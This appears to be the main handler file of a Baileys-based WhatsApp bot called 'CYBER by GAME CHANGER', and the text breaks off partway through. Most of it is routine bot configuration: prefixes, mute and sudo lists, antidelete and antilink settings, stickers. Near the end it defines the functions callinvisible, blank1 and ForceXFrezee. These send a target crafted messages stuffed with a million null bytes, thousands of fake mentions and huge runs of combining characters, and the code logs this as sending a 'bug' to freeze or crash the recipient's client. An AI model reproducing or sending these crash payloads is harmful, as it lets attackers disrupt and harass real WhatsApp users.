
require('./setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { downloadMediaMessage } = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const { spawn: spawn, exec } = require('child_process')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const { ytDownload, ytAudio, extractVideoId } = require('./allfunc/ytdownload')
const { igDownload } = require('./allfunc/igdownload')
const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
const FormData = require('form-data');
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
const richpic = fs.readFileSync(`./media/image1.jpg`)
const numberEmojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];

// ============ CREATE REQUIRED DIRECTORIES ============
const requiredDirs = [
    './database',
    './database/pairing',
    './database/sessions',
    './tmp',
    './media'
];

requiredDirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        console.log(`📁 Created directory: ${dir}`);
    }
});
// ====================================================

// ============ PERSISTENT STORAGE FOR MUTED USERS ============
const MUTED_FILE = './database/muted.json';

function loadMutedData() {
  try {
    if (!fs.existsSync(MUTED_FILE)) {
      fs.writeFileSync(MUTED_FILE, JSON.stringify({}));
    }
    return JSON.parse(fs.readFileSync(MUTED_FILE));
  } catch (e) {
    console.log('Error loading muted data:', e);
    return {};
  }
}

function saveMutedData(data) {
  try {
    fs.writeFileSync(MUTED_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (e) {
    console.log('Error saving muted data:', e);
    return false;
  }
}

// Load existing muted data
global.muted = loadMutedData();
// ============================================================

// ============ SUDO FUNCTIONS ============
const SUDO_FILE = './database/sudo.json';

function loadSudoList() {
  if (!fs.existsSync(SUDO_FILE)) {
    fs.writeFileSync(SUDO_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(SUDO_FILE));
}

function saveSudoList(data) {
  fs.writeFileSync(SUDO_FILE, JSON.stringify(data, null, 2));
}
// ========================================

// ============ PREFIX FUNCTIONS ============
const PREFIX_FILE = './database/prefixes.json';

function loadPrefixes() {
  if (!fs.existsSync(PREFIX_FILE)) {
    fs.writeFileSync(PREFIX_FILE, JSON.stringify({}));
  }
  return JSON.parse(fs.readFileSync(PREFIX_FILE));
}

function savePrefixes(data) {
  fs.writeFileSync(PREFIX_FILE, JSON.stringify(data, null, 2));
}

function getUserPrefix(userId) {
  const prefixes = loadPrefixes();
  return prefixes[userId] || '.'; // Default to '.' if no custom prefix
}

function setUserPrefix(userId, prefix) {
  const prefixes = loadPrefixes();
  prefixes[userId] = prefix;
  savePrefixes(prefixes);
}

// ============ SESSION FUNCTIONS ============
const SESSION_FILE = './database/sessions.json';
const PAIRING_DIR = './database/pairing/';

function loadUsers() {
    try {
        if (!fs.existsSync(SESSION_FILE)) {
            fs.writeFileSync(SESSION_FILE, JSON.stringify([]));
        }
        return JSON.parse(fs.readFileSync(SESSION_FILE));
    } catch (e) {
        console.log('Error loading sessions:', e);
        return [];
    }
}

function getSession(userId) {
    try {
        const cleanId = userId.split('@')[0].replace(/[^0-9]/g, '');
        const sessionFiles = fs.readdirSync(PAIRING_DIR).filter(file => 
            file.includes(cleanId) || file.includes(userId)
        );
        
        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(PAIRING_DIR, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath));
            
            return {
                user: { id: userId },
                id: userId,
                jid: userId,
                data: sessionData,
                sendMessage: async (jid, message) => {
                    try {
                        // Check if devtrust exists and is ready
                        if (typeof devtrust !== 'undefined' && devtrust && devtrust.sendMessage) {
                            return await devtrust.sendMessage(jid, message);
                        } else {
                            console.log(`⚠️ devtrust not ready yet for ${userId}, message queued`);
                            // Store message to send later (optional - you can implement a queue)
                            return null;
                        }
                    } catch (err) {
                        console.error(`SendMessage error for ${userId}:`, err);
                        return null;
                    }
                }
            };
        }
        return null;
    } catch (e) {
        console.log('Error getting session:', e);
        return null;
    }
}
// ========================================

// ============ GLOBAL VARIABLES ============
global.packname = "CYBER";
global.author = "GAME CHANGER";
// ============ GLOBAL VARIABLES FOR FEATURES ============
global.antispam = {};      // For anti-spam feature
global.warns = {};         // For warning system
global.muted = {};         // For mute system
global.banned = global.banned || {};  // For banned users

// ============ ANTIEDIT / ANTIDELETE STORES ============
if (!global._antieditStore) global._antieditStore = new Map();
if (!global._antideleteStore) global._antideleteStore = new Map();
if (!global._antieditConfig) global._antieditConfig = { mode: 'off' };
if (!global._antideleteConfig) global._antideleteConfig = { mode: 'off' };

const ANTIEDIT_CONFIG_FILE = './database/antiedit_config.json';
const ANTIDELETE_CONFIG_FILE = './database/antidelete_config.json';
const ANTIDELETE_TEMP_DIR = './tmp/antidelete_media';
const ANTIDELETE_DISK_STORE = './database/antidelete_store.json';
const ANTICALL_CONFIG_FILE = './database/anticall_config.json';
const STICKERCMD_FILE = './database/stickercmds.json';
const WARNLIMIT_FILE = './database/warnlimit.json';
const LOCK_SETTINGS_FILE = './database/lock_settings.json';
const ANTIGROUPMENTION_FILE = './database/antigroupmention.json';
const ANTICALL_MSG_FILE = './database/anticall_msg.json';

function getBotJid(sock) {
    // Try sock.user first (set when connected), fall back to authState.creds.me if available
    const rawId = sock?.user?.id || sock?.authState?.creds?.me?.id || '';
    const botNum = rawId.split(':')[0].split('@')[0];
    return botNum ? `${botNum}@s.whatsapp.net` : '';
}

function jidToNum(jid = '') {
    return String(jid).split('@')[0].split(':')[0];
}

function isOwnMessage(msg, sock) {
    const botNum = jidToNum(getBotJid(sock));
    const sender = msg?.key?.participant || msg?.participant || msg?.key?.remoteJid || '';
    return Boolean(msg?.key?.fromMe || (botNum && jidToNum(sender) === botNum));
}

function antiStoreKey(chatId, msgId) {
    return `${chatId || 'unknown'}::${msgId}`;
}

// ── Persistent antidelete disk store helpers ──
const ANTIDELETE_MAX_ENTRIES = 2000;

function _saveDiskStore() {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        const entries = [];
        for (const [key, val] of global._antideleteStore.entries()) {
            entries.push([key, val]);
        }
        // Keep only last ANTIDELETE_MAX_ENTRIES
        const trimmed = entries.slice(-ANTIDELETE_MAX_ENTRIES);
        fs.writeFileSync(ANTIDELETE_DISK_STORE, JSON.stringify(trimmed), 'utf-8');
    } catch (e) {}
}

function _loadDiskStore() {
    try {
        if (fs.existsSync(ANTIDELETE_DISK_STORE)) {
            const entries = JSON.parse(fs.readFileSync(ANTIDELETE_DISK_STORE, 'utf-8'));
            if (Array.isArray(entries)) {
                const now = Date.now();
                for (const [key, val] of entries) {
                    // Skip entries older than 24 hours
                    if (val?.timestamp && (now - new Date(val.timestamp).getTime()) > 24 * 60 * 60 * 1000) continue;
                    global._antideleteStore.set(key, val);
                }
            }
        }
    } catch (e) {}
}

function _getFromDiskStore(key) {
    try {
        if (fs.existsSync(ANTIDELETE_DISK_STORE)) {
            const entries = JSON.parse(fs.readFileSync(ANTIDELETE_DISK_STORE, 'utf-8'));
            if (Array.isArray(entries)) {
                const found = entries.find(([k]) => k === key);
                return found ? found[1] : null;
            }
        }
    } catch (e) {}
    return null;
}

// Load disk store into memory on startup (only once per process)
if (!global._antideleteStoreLoaded) {
    _loadDiskStore();
    global._antideleteStoreLoaded = true;
}

// Ensure temp dir exists
if (!fs.existsSync(ANTIDELETE_TEMP_DIR)) {
    try { fs.mkdirSync(ANTIDELETE_TEMP_DIR, { recursive: true }); } catch (e) {}
}

function loadAntieditCfg() {
    try {
        if (fs.existsSync(ANTIEDIT_CONFIG_FILE)) {
            const d = JSON.parse(fs.readFileSync(ANTIEDIT_CONFIG_FILE, 'utf-8'));
            // migrate old format
            if (d.mode === 'private') return d;
            if (d.mode === 'chat' || d.mode === 'true') return { mode: 'chat' };
            if (d.mode === 'false') return { mode: 'off' };
            return d;
        }
    } catch (e) {}
    return { mode: 'private' };
}
function saveAntieditCfg(cfg) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(ANTIEDIT_CONFIG_FILE, JSON.stringify(cfg, null, 2));
        global._antieditConfig = cfg;
    } catch (e) { console.error('[ANTIEDIT] Config save error:', e); }
}
function _antideleteCfgFile(botNum) {
    if (botNum) return `./database/antidelete_config_${botNum}.json`;
    return ANTIDELETE_CONFIG_FILE;
}
function loadAntideleteCfg(botNum) {
    // Try per-bot config first, then fall back to shared global config
    const filesToTry = botNum
        ? [`./database/antidelete_config_${botNum}.json`, ANTIDELETE_CONFIG_FILE]
        : [ANTIDELETE_CONFIG_FILE];
    for (const f of filesToTry) {
        try {
            if (fs.existsSync(f)) {
                const d = JSON.parse(fs.readFileSync(f, 'utf-8'));
                // migrate old format { enabled: true/false }
                if (d.mode) return d;
                if (d.enabled === true) return { mode: 'private' };
            }
        } catch (e) {}
    }
    return { mode: 'off' };
}
function saveAntideleteCfg(cfg, botNum) {
    const cfgFile = _antideleteCfgFile(botNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2));
        global._antideleteConfig = cfg;
    } catch (e) { console.error('[ANTIDELETE] Config save error:', e); }
}

// ============ ANTICALL HELPERS ============
function loadAnticallCfg() {
    try {
        if (fs.existsSync(ANTICALL_CONFIG_FILE)) return JSON.parse(fs.readFileSync(ANTICALL_CONFIG_FILE, 'utf-8'));
    } catch (e) {}
    return { mode: 'off' };
}
function saveAnticallCfg(cfg) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(ANTICALL_CONFIG_FILE, JSON.stringify(cfg, null, 2));
    } catch (e) {}
}
function loadAnticallMsg() {
    try {
        if (fs.existsSync(ANTICALL_MSG_FILE)) return JSON.parse(fs.readFileSync(ANTICALL_MSG_FILE, 'utf-8'));
    } catch (e) {}
    return { msg: null };
}
function saveAnticallMsg(data) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(ANTICALL_MSG_FILE, JSON.stringify(data, null, 2));
    } catch (e) {}
}

// ============ STICKER CMD HELPERS ============
function loadStickerCmds() {
    try {
        if (fs.existsSync(STICKERCMD_FILE)) return JSON.parse(fs.readFileSync(STICKERCMD_FILE, 'utf-8'));
    } catch (e) {}
    return {};
}
function saveStickerCmds(data) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(STICKERCMD_FILE, JSON.stringify(data, null, 2));
    } catch (e) {}
}

// ============ WARN LIMIT HELPERS ============
function getWarnLimit(chatId) {
    try {
        if (fs.existsSync(WARNLIMIT_FILE)) {
            const d = JSON.parse(fs.readFileSync(WARNLIMIT_FILE, 'utf-8'));
            return d[chatId] || d['default'] || 3;
        }
    } catch (e) {}
    return 3;
}
function setWarnLimit(chatId, limit) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        let d = {};
        if (fs.existsSync(WARNLIMIT_FILE)) d = JSON.parse(fs.readFileSync(WARNLIMIT_FILE, 'utf-8'));
        d[chatId] = limit;
        fs.writeFileSync(WARNLIMIT_FILE, JSON.stringify(d, null, 2));
    } catch (e) {}
}

// ============ LOCK SETTINGS HELPERS ============
function isSettingsLocked() {
    try {
        if (fs.existsSync(LOCK_SETTINGS_FILE)) {
            return JSON.parse(fs.readFileSync(LOCK_SETTINGS_FILE, 'utf-8')).locked === true;
        }
    } catch (e) {}
    return false;
}
function setSettingsLock(val) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(LOCK_SETTINGS_FILE, JSON.stringify({ locked: val }, null, 2));
    } catch (e) {}
}

// ============ ANTIGROUPMENTION HELPERS ============
function loadAntigroupmentionSettings() {
    try {
        if (fs.existsSync(ANTIGROUPMENTION_FILE)) return JSON.parse(fs.readFileSync(ANTIGROUPMENTION_FILE, 'utf-8'));
    } catch (e) {}
    return {};
}
function saveAntigroupmentionSettings(data) {
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(ANTIGROUPMENTION_FILE, JSON.stringify(data, null, 2));
    } catch (e) {}
}
let antigroupmentionSettings = loadAntigroupmentionSettings();
const tictactoeGames = {};
const hangmanGames = {};
const hangmanVisual = [
    "😃🪓______", "😃🪓__|____", "😃🪓__|/___",
    "😃🪓__|/__", "😃🪓__|/\\_", "😃🪓__|/\\_", "💀 Game Over!"
];
const { getSetting, setSetting } = require("./setting/Settings.js");
const groupCache = new Map();

// ============ ANTI-LINK SETTINGS - MOVED UP HERE ============
const ANTILINK_FILE = './database/antilink_settings.json';

function loadAntilinkSettings() {
    try {
        if (!fs.existsSync(ANTILINK_FILE)) {
            fs.writeFileSync(ANTILINK_FILE, JSON.stringify({}));
            console.log('📁 Created antilink_settings.json file');
        }
        const data = fs.readFileSync(ANTILINK_FILE, 'utf-8');
        return JSON.parse(data);
    } catch (e) {
        console.log('⚠️ Error loading antilink settings:', e.message);
        return {};
    }
}

function saveAntilinkSettings(settings) {
    try {
        fs.writeFileSync(ANTILINK_FILE, JSON.stringify(settings, null, 2));
        return true;
    } catch (e) {
        console.log('⚠️ Error saving antilink settings:', e.message);
        return false;
    }
}

// Load antilink settings BEFORE anything else uses them
let antilinkSettings = loadAntilinkSettings();
// =========================================================

// ============ MESSAGE KONTOL (MUST BE BEFORE forclose) ============
const messageKontol = {
  key: {
    remoteJid: "5521992999999@s.whatsapp.net",
    fromMe: false,
    id: "CALL_MSG_" + Date.now(),
    participant: "5521992999999@s.whatsapp.net"
  },
  message: {
    callLogMessage: {
      isVideo: true,
      callOutcome: "1",
      durationSecs: "0",
      callType: "REGULAR",
      participants: [
        {
          jid: "5521992999999@s.whatsapp.net",
          callOutcome: "1"
        }
      ]
    }
  }
};
// ========================================

module.exports = devtrust = async (devtrust, m, chatUpdate, store) => {
const { from } = m
try {

// ✅ GUARD: If socket not fully authenticated yet, skip silently
if (!devtrust || !devtrust.user) return;
      
// Newsletter configuration
const NEWSLETTER_JID = '120363408022768294@newsletter';
const NEWSLETTER_NAME = "© CYBER by GAME CHANGER";

const addNewsletterContext = (messageContent) => {
  if (messageContent.contextInfo) {
    return {
      ...messageContent,
      contextInfo: {
        ...messageContent.contextInfo,
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: NEWSLETTER_JID,
          newsletterName: NEWSLETTER_NAME,
          serverMessageId: -1
        }
      }
    };
  }
  return {
    ...messageContent,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: NEWSLETTER_JID,
        newsletterName: NEWSLETTER_NAME,
        serverMessageId: -1
      }
    }
  };
};

const replyWithNewsletter = async (jid, text, quotedMsg, mentions = []) => {
  try {
    await devtrust.sendMessage(jid, 
      addNewsletterContext({ 
        text: text,
        mentions: mentions 
      }), 
      { quoted: quotedMsg }
    );
  } catch (error) {
    console.error('Reply with newsletter error:', error);
    await devtrust.sendMessage(jid, 
      { text: text, mentions: mentions }, 
      { quoted: quotedMsg }
    );
  }
};

const reply = async (text, mentions = []) => {
  try {
    return await replyWithNewsletter(m.chat, text, m, mentions);
  } catch (error) {
    console.error('Reply failed:', error);
    return null;
  }
};

// ======================[ FIXED COMMAND DETECTION ]======================
let body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :
    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :
    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :
    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :
    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[Pesan sekali lihat]") :
    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[Pesan sementara]") :
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
    ""
);


// ============ COMMAND DETECTION (PER-USER PREFIX) ============
const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./allfunc/premium.json'))
const ownerNumber = owner[0] || "254700000000";

// Get user-specific prefix from the new system
let prefix = getUserPrefix(m.sender);

// STRICT command detection - ONLY detect if message STARTS WITH user's prefix
const isCmd = body && typeof body === 'string' && body.startsWith(prefix);

let command = '';
let args = [];
let text = '';

if (isCmd) {
    // Extract command ONLY if it starts with user's prefix
    const afterPrefix = body.slice(prefix.length).trim();
    const parts = afterPrefix.split(/ +/);
    command = parts[0].toLowerCase();
    args = parts.slice(1);
    text = args.join(' ');
    
    console.log('✅ Command detected for user:', command);
}

// SPECIAL CHECK: If user types ONLY the default "." - show THEIR current prefix
if (body && body.trim() === '.') {
    reply(`🔧 *Your current prefix:* \`${prefix}\`\n_You can change it using_ \`${prefix}setprefix [new]\``);
    return;
}

const qtext = args.join(" ");
const q = args.join(" ");
const tempMailData = {};
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid;
const userMovieSessions = {};
const groupMetadata = m.isGroup ? await devtrust.groupMetadata(from).catch(() => null) : null;
const participants = m.isGroup ? groupMetadata?.participants || [] : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : [];
const botNumber = await devtrust.decodeJid(devtrust.user.id);

// ── Bot disable check (admin panel → database/bot_disabled.json) ──
const _botDisabled = (() => {
    try {
        const _bdf = './database/bot_disabled.json';
        if (fs.existsSync(_bdf)) {
            const _list = JSON.parse(fs.readFileSync(_bdf, 'utf8'));
            const _cleanBot = botNumber.replace(/[^0-9]/g, '');
            return _list.some(id => String(id).replace(/[^0-9]/g, '') === _cleanBot || String(id) === botNumber);
        }
    } catch(e) {}
    return false;
})();
if (_botDisabled) return;

const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isDev = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isSudo = loadSudoList().includes(m.sender);
// 18+ unlock status for this sender
const _senderAdultUnlocked = (() => {
    try {
        const _auf = './database/adult_unlocked.json';
        if (fs.existsSync(_auf)) {
            const _u = JSON.parse(fs.readFileSync(_auf, 'utf-8'));
            const _n = (m.sender || '').replace(/[^0-9]/g, '');
            return _u.some(id => String(id).replace(/[^0-9]/g, '') === _n);
        }
    } catch(e) {}
    return false;
})();
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
const pushname = m.pushName || "No Name";
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

// ============ STICKER HELPER FUNCTIONS ============
async function sendImageAsSticker(chatId, media, quoted, options = {}) {
    try {
        const sticker = new Sticker(media, {
            pack: options.packname || global.packname || "CYBER",
            author: options.author || global.author || "GAME CHANGER",
            type: StickerTypes.FULL,
            quality: 80,
            background: '#00000000'
        });
        const stickerBuffer = await sticker.toBuffer();
        await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
        return true;
    } catch (error) {
        console.error('Image sticker error:', error);
        throw error;
    }
}

async function sendVideoAsSticker(chatId, media, quoted, options = {}) {
    try {
        const sticker = new Sticker(media, {
            pack: options.packname || global.packname || "CYBER",
            author: options.author || global.author || "GAME CHANGER",
            type: StickerTypes.FULL,
            quality: 50,
            background: '#00000000'
        });
        const stickerBuffer = await sticker.toBuffer();
        await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
        return true;
    } catch (error) {
        console.error('Video sticker error:', error);
        throw error;
    }
}

// ============ STYLETEXT FUNCTION ============
async function styletext(text) {
    return [
        { name: 'Normal', result: text },
        { name: 'Bold', result: '**' + text + '**' },
        { name: 'Italic', result: '*' + text + '*' },
        { name: 'Strikethrough', result: '~' + text + '~' },
        { name: 'Monospace', result: '```' + text + '```' }
    ];
}

// ============ RANDOM COLOR FUNCTION ============
function randomColor() {
    const colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white', 'greenBright', 'yellowBright'];
    const colorIndex = Math.floor(Math.random() * colors.length);
    const colorName = colors[colorIndex];
    
    // Return chalk color function
    switch(colorName) {
        case 'red': return chalk.red;
        case 'green': return chalk.green;
        case 'yellow': return chalk.yellow;
        case 'blue': return chalk.blue;
        case 'magenta': return chalk.magenta;
        case 'cyan': return chalk.cyan;
        case 'white': return chalk.white;
        case 'greenBright': return chalk.greenBright;
        case 'yellowBright': return chalk.yellowBright;
        default: return chalk.white;
    }
}
// ==================================================

async function callinvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Danzz Bjir",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await devtrust.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function blank1(target) {
 try {
  const anta = 'ោ៝'.repeat(20000);
  const nyocot = 'ꦾ'.repeat(20000);
  const msg = {

      newsletterAdminInviteMessage: {
      newsletterJid: "1234567891234@newsletter",
      newsletterName: "sv Danzz ya bang" + "ោ៝".repeat(20000),
      caption: "Halo" + anta + nyocot + "ោ៝".repeat(20000),
      inviteExpiration: "90000",
      contextInfo: {
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await devtrust.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}

async function ForceXFrezee(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await devtrust.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "CYBER Destroyed" + "ꦾ".repeat(77777),
      publisher: "GAME CHANGER",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
